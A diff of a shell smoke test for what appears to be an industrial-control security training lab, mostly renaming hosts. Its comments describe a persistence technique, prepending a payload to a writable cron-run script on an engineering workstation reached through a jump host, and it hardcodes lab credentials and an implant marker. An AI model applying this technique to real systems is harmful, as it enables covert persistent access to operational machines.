@@ -2,7 +2,7 @@
 # Persistence probe. The engineering workstation's plc-poll cron runs
 # /opt/win10/C/Users/engineer/Tools/poll_and_ingest.py every minute as
 # engineer, and the script is owned and writable by engineer. A visitor
-# who lands as engineer (via the existing admin-home pivot) does not need
+# who lands as engineer (via the existing wizzards-retreat pivot) does not need
 # root or a new cron entry: they just prepend a line to the existing
 # script, and the cron daemon runs their payload on the next tick.
 #
@@ -20,21 +20,21 @@ set -uo pipefail
 REPO="$(cd "$(dirname "$0")/../.." && pwd)"
 source "$REPO/tests/smoke/lib.sh"
 
-ATTACKER="attacker-machine"
-JUMP_HOST="10.10.0.10"           # admin-home / wizzards-retreat
+ATTACKER="unseen-gate"
+JUMP_HOST="10.10.0.10"           # wizzards-retreat / wizzards-retreat
 JUMP_USER="rincewind"
 JUMP_PASS="wizzard"
-TARGET_HOST="10.10.2.30"         # engineering-workstation, ops side
+TARGET_HOST="10.10.2.30"         # uupl-eng-ws, ops side
 TARGET_USER="engineer"
 TARGET_PASS="spanner99"
 SCRIPT_PATH="/opt/win10/C/Users/engineer/Tools/poll_and_ingest.py"
 MARKER="/tmp/uupl_persist_implant_marker"
 
 require_running "$ATTACKER"
-require_running "admin-home"
-require_running "engineering-workstation"
+require_running "wizzards-retreat"
+require_running "uupl-eng-ws"
 
-# Helper: run a multi-line Python program on eng-ws via the admin-home jump,
+# Helper: run a multi-line Python program on eng-ws via the wizzards-retreat jump,
 # using the facade's `python -c "<code>"` path. The code is base64-encoded
 # so newlines and quoting survive the SSH-shell-facade-python layers.
 run_py_on_engws() {
